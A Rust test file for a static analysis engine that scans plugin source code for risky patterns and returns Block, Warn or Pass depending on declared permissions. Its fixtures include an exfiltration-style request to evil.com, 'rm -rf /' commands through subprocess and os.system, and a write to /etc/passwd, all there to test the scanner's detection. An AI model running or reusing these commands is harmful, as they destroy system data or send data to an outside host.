//! Tests for the static analysis engine.
//!
//! Includes both unit tests (single-file scan + verdict) and integration tests
//! (directory-level `scan_skill()` with permission-aware logic). Included via
//! `#[path = "static_analysis_tests.rs"]` from `static_analysis.rs`.

use super::*;
use crate::openhuman::skills::manifest::FilesystemPerms;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn default_perms() -> Permissions {
    Permissions {
        network: false,
        filesystem: FilesystemPerms {
            read: vec![],
            write: vec![],
        },
    }
}

fn make_rules() -> Vec<AnalysisRule> {
    default_rules()
}

fn skill_dir() -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("tempdir creation");
    let src = dir.path().join("src");
    std::fs::create_dir_all(&src).expect("create src dir");
    dir
}

fn write_source(dir: &Path, rel_path: &str, content: &str) {
    let full_path = dir.join("src").join(rel_path);
    if let Some(parent) = full_path.parent() {
        std::fs::create_dir_all(parent).expect("create parent dir");
    }
    std::fs::write(&full_path, content).expect("write source file");
}

// ===========================================================================
// Unit tests — single-file scan + verdict
// ===========================================================================

/// Source containing `os` / `subprocess` imports returns Block verdict.
#[test]
fn block_on_suspicious_import() {
    let content = r#"
import os
import subprocess
print("hello")
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("test.py"), &rules);
    assert!(
        !findings.is_empty(),
        "expected findings for os/subprocess imports"
    );

    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Block);
}

/// Source with `std::fs::write` to a system path returns Block.
#[test]
fn block_on_unsafe_filesystem_write() {
    let content = r#"
fn save_data() {
    std::fs::write("/etc/passwd", "data").unwrap();
}
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/lib.rs"), &rules);
    let has_fs_write = findings.iter().any(|f| f.pattern == "Filesystem write");
    assert!(has_fs_write, "expected Filesystem write finding");

    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Block);
}

/// Source with `requests.get()` without network permission returns Block.
#[test]
fn block_on_network_call() {
    let content = r#"
import requests
response = requests.get("https://evil.com/exfil")
print(response.text)
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/main.py"), &rules);
    let has_http = findings.iter().any(|f| f.pattern == "HTTP request");
    assert!(has_http, "expected HTTP request finding");

    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Block);
}

/// Benign source code returns Pass.
#[test]
fn pass_on_safe_code() {
    let content = r#"
fn greet(name: &str) -> String {
    format!("Hello, {}!", name)
}
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/lib.rs"), &rules);
    assert!(findings.is_empty(), "expected no findings for safe code");

    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Pass);
}

/// `eval()` in comments is still detected as Critical (v1 text scan).
#[test]
fn warn_on_ambiguous_pattern() {
    let content = r#"
// This uses eval() in a comment only — not executable.
fn safe() -> u32 {
    42
}
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/lib.rs"), &rules);
    assert!(
        !findings.is_empty(),
        "expected findings for eval in comments"
    );
    let has_eval = findings.iter().any(|f| f.pattern == "Use of eval()");
    assert!(has_eval, "expected eval() finding");

    // eval() is Critical → Block (v1 is text-only, no AST awareness).
    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Block);
}

/// Empty source returns Pass.
#[test]
fn empty_source_returns_pass() {
    let content = "";
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/lib.rs"), &rules);
    assert!(findings.is_empty(), "expected no findings for empty source");

    let verdict = compute_verdict(&findings, &default_perms());
    assert_eq!(verdict, AnalysisVerdict::Pass);
}

/// Write to a path matching `Permissions.write` returns Pass.
#[test]
fn allows_permitted_filesystem_write() {
    let content = r#"
fn save_output() {
    std::fs::write("data/output.txt", "content").unwrap();
}
"#;
    let rules = make_rules();
    let findings = scan_file(content, Path::new("src/lib.rs"), &rules);
    assert!(
        findings.iter().any(|f| f.pattern == "Filesystem write"),
        "expected Filesystem write finding"
    );

    let perms = Permissions {
        network: false,
        filesystem: FilesystemPerms {
            read: vec![],
            write: vec!["data/**".to_string()],
        },
    };
    let verdict = compute_verdict(&findings, &perms);
    assert_eq!(verdict, AnalysisVerdict::Pass);
}

/// `scan_file_for_writes` extracts write targets from source code.
#[test]
fn scan_file_for_writes_extracts_target() {
    let dir = tempfile::tempdir().unwrap();
    let file_path = dir.path().join("lib.rs");
    std::fs::write(&file_path, r#"std::fs::write("/data/out.txt", "hello")"#).unwrap();

    let targets = scan_file_for_writes(&file_path);
    assert_eq!(targets, vec!["/data/out.txt"]);
}

/// At least 15 built-in rules exist.
#[test]
fn default_rules_count() {
    let rules = default_rules();
    assert!(
        rules.len() >= 15,
        "expected at least 15 built-in rules, got {}",
        rules.len()
    );
}

/// Severity distribution across rules is balanced.
#[test]
fn severity_classification() {
    let rules = default_rules();
    let critical_count = rules
        .iter()
        .filter(|r| r.severity == FindingSeverity::Critical)
        .count();
    let high_count = rules
        .iter()
        .filter(|r| r.severity == FindingSeverity::High)
        .count();
    let medium_count = rules
        .iter()
        .filter(|r| r.severity == FindingSeverity::Medium)
        .count();
    assert!(
        critical_count >= 5,
        "expected >=5 Critical rules, got {critical_count}"
    );
    assert!(high_count >= 5, "expected >=5 High rules, got {high_count}");
    assert!(
        medium_count >= 3,
        "expected >=3 Medium rules, got {medium_count}"
    );
}

/// `eval()` is correctly detected in source code.
#[test]
fn detects_eval() {
    let content = r#"eval("malicious_code")"#;
    let findings = scan_file(content, Path::new("test.js"), &make_rules());
    assert!(
        findings.iter().any(|f| f.pattern == "Use of eval()"),
        "expected eval() to be detected"
    );
}

/// `require('child_process')` is correctly detected.
#[test]
fn detects_child_process() {
    let content = r#"const { exec } = require('child_process');"#;
    let findings = scan_file(content, Path::new("test.js"), &make_rules());
    assert!(
        findings.iter().any(|f| f.pattern == "Child process module"),
        "expected child_process to be detected"
    );
}

/// Block result summary contains BLOCK header and CRITICAL finding.
#[test]
fn analysis_result_summary_formatting() {
    let result = AnalysisResult {
        verdict: AnalysisVerdict::Block,
        findings: vec![AnalysisFinding {
            severity: FindingSeverity::Critical,
            file: "src/main.py".to_string(),
            line: 5,
            pattern: "Use of eval()".to_string(),
            snippet: "eval(data)".to_string(),
        }],
        errors: vec![],
    };
    let summary = result.summary();
    assert!(summary.contains("BLOCK"));
    assert!(summary.contains("CRITICAL"));
    assert!(summary.contains("eval(data)"));
}

/// Pass result summary contains PASS header and success message.
#[test]
fn pass_result_summary() {
    let result = AnalysisResult {
        verdict: AnalysisVerdict::Pass,
        findings: vec![],
        errors: vec![],
    };
    let summary = result.summary();
    assert!(summary.contains("PASS"));
    assert!(summary.contains("No suspicious patterns detected"));
}

/// Binary files in src/ are skipped (non-UTF8 read failure).
#[test]
fn binary_file_read_returns_empty_findings() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("src").join("output.wasm");
    std::fs::create_dir_all(bin_path.parent().unwrap()).unwrap();
    std::fs::write(&bin_path, &[0u8, 0x9Au8, 0x9Bu8, 0x9Cu8]).unwrap();

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

/// Skill directory without `src/` returns empty result.
#[test]
fn no_src_dir_returns_empty_result() {
    let dir = tempfile::tempdir().unwrap();
    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

// ===========================================================================
// Integration tests — directory-level scanning with permissions
// ===========================================================================

/// Directory-level scan collects findings from multiple source files.
#[test]
fn scan_skill_directory_with_mixed_files() {
    let dir = skill_dir();

    write_source(
        dir.path(),
        "greet.rs",
        "pub fn greet(name: &str) -> String { format!(\"Hello, {}!\", name) }\n",
    );
    write_source(
        dir.path(),
        "danger.py",
        "def process(input_str):\n    eval(input_str)\n",
    );
    write_source(
        dir.path(),
        "runner.py",
        "import subprocess\nsubprocess.run([\"rm\", \"-rf\", \"/\"])\n",
    );

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(
        !result.findings.is_empty(),
        "expected findings from mixed scan"
    );

    assert!(
        result.findings.iter().any(|f| f.pattern == "Use of eval()"),
        "expected eval() finding from danger.py"
    );
    assert!(
        result
            .findings
            .iter()
            .any(|f| f.pattern == "Subprocess execution"),
        "expected subprocess finding"
    );
    assert_eq!(result.verdict, AnalysisVerdict::Block);
}

/// When `permissions.network = true`, network High findings → Pass.
#[test]
fn network_allowed_in_permissions() {
    let dir = skill_dir();
    write_source(
        dir.path(),
        "fetch.py",
        "import requests\nrequests.get(\"http://example.com/data\")\n",
    );

    // No network → Block.
    let result_no_net = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result_no_net
        .findings
        .iter()
        .any(|f| f.pattern == "HTTP request"));
    assert_eq!(result_no_net.verdict, AnalysisVerdict::Block);

    // With network → Pass.
    let perms = Permissions {
        network: true,
        filesystem: FilesystemPerms {
            read: vec![],
            write: vec![],
        },
    };
    assert_eq!(
        scan_skill(dir.path(), &perms).unwrap().verdict,
        AnalysisVerdict::Pass
    );
}

/// When write path matches `permissions.filesystem.write`, finding → Pass.
#[test]
fn write_path_allowed_in_permissions() {
    let dir = skill_dir();
    write_source(
        dir.path(),
        "output.rs",
        "fn save() { std::fs::write(\"data/result.txt\", \"ok\").unwrap(); }\n",
    );

    // Without write permission → Block.
    let result_no_perm = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result_no_perm
        .findings
        .iter()
        .any(|f| f.pattern == "Filesystem write"));
    assert_eq!(result_no_perm.verdict, AnalysisVerdict::Block);

    // With matching write permission → Pass.
    let perms = Permissions {
        network: false,
        filesystem: FilesystemPerms {
            read: vec![],
            write: vec!["data/**".to_string()],
        },
    };
    assert_eq!(
        scan_skill(dir.path(), &perms).unwrap().verdict,
        AnalysisVerdict::Pass
    );
}

/// Skill dir without `src/` returns empty findings, Pass verdict.
#[test]
fn no_source_dir_returns_empty_result() {
    let dir = tempfile::tempdir().expect("tempdir creation");
    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

/// Binary and non-source files in `src/` are skipped.
#[test]
fn binary_file_skipped() {
    let dir = tempfile::TempDir::new().unwrap();
    let wasm_path = dir.path().join("src").join("module.wasm");
    std::fs::create_dir_all(wasm_path.parent().unwrap()).unwrap();
    std::fs::write(&wasm_path, &[0u8, 0x9Au8, 0x9Bu8, 0x9Cu8, 0xFFu8]).unwrap();

    let png_path = dir.path().join("src").join("icon.png");
    std::fs::write(&png_path, &[0x89u8, b'P', b'N', b'G']).unwrap();

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

/// Non-source extensions (.md, .txt) are skipped.
#[test]
fn unsupported_extensions_skipped() {
    let dir = skill_dir();
    write_source(
        dir.path(),
        "notes.md",
        "This contains eval() but .md is not supported.\n",
    );
    write_source(dir.path(), "config.txt", "eval(\"harmless\")\n");

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(
        result.findings.is_empty(),
        "expected no findings for unsupported extensions"
    );
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

/// Medium-severity findings produce Warn (not Block).
#[test]
fn medium_severity_produces_warn() {
    let dir = skill_dir();
    write_source(
        dir.path(),
        "config.py",
        "import os\nhome = os.environ.get(\"HOME\")\n",
    );

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    let has_env = result
        .findings
        .iter()
        .any(|f| f.pattern == "Environment access");
    assert!(has_env, "expected Environment access finding");

    assert_eq!(result.verdict, AnalysisVerdict::Warn);
}

/// Only supported source extensions are scanned.
#[test]
fn scans_only_supported_extensions() {
    let dir = skill_dir();
    write_source(
        dir.path(),
        "unsafe.rs",
        "std::process::Command::new(\"rm\");\n",
    );
    write_source(dir.path(), "danger.py", "os.system(\"rm -rf /\")\n");
    write_source(dir.path(), "Cargo.toml", "[dependencies]\nhttp = \"0.1\"\n");

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(
        !result.findings.is_empty(),
        "expected findings from .rs and .py files"
    );
    assert!(result
        .findings
        .iter()
        .any(|f| f.pattern == "Process execution"));
    assert!(result
        .findings
        .iter()
        .any(|f| f.pattern == "Shell command execution"));
    assert_eq!(result.verdict, AnalysisVerdict::Block);
}

/// Scan with walk errors still returns partial results.
#[test]
fn scan_with_partial_errors() {
    let dir = skill_dir();
    write_source(dir.path(), "good.rs", "fn main() {}\n");

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    // good.rs produces no findings.
    assert!(result.findings.is_empty());
    assert_eq!(result.verdict, AnalysisVerdict::Pass);
}

/// Multiple files each contribute their findings.
#[test]
fn multiple_files_contributing_findings() {
    let dir = skill_dir();
    write_source(dir.path(), "app.js", "eval(userInput);\n");
    write_source(
        dir.path(),
        "network.py",
        "import socket\ns = socket.socket()\n",
    );
    write_source(
        dir.path(),
        "storage.rs",
        "std::fs::write(\"/tmp/out\", data)?;\n",
    );

    let result = scan_skill(dir.path(), &default_perms()).unwrap();
    assert!(result.findings.iter().any(|f| f.pattern == "Use of eval()"));
    assert!(result.findings.iter().any(|f| f.pattern == "Socket import"));
    assert!(result
        .findings
        .iter()
        .any(|f| f.pattern == "Filesystem write"));
    assert_eq!(result.verdict, AnalysisVerdict::Block);
}
